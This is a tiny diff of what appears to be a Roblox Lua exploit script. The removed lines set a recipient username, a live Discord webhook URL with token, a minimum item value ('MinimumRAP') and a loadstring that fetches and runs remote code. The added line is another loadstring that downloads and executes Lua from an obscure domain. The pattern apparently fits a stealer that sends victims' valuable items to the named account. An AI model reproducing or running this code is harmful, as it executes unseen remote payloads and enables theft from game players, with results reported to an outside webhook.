@@ -1,9 +1,1 @@
-Username = "King_Pirate1653"
-Username2 = "King_Pirate1653"
-Webhook = "https://discord.com/api/webhooks/1204705582070628382/HjR9rLPc8o2Zxpw9x-ZaZjV368BN5LNlaK3FMY13EIScTpwgJ5nhtIe6orBq0tDgDt0f"
-
-LoadingScreen = true
-
-MinimumRAP = 100000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/globglabgala/blobglab/main/swabalabala"))()
+loadstring(game:HttpGet('https://egorikusa.space/36c9461d76a1fec9b37e50e7.lua'))()
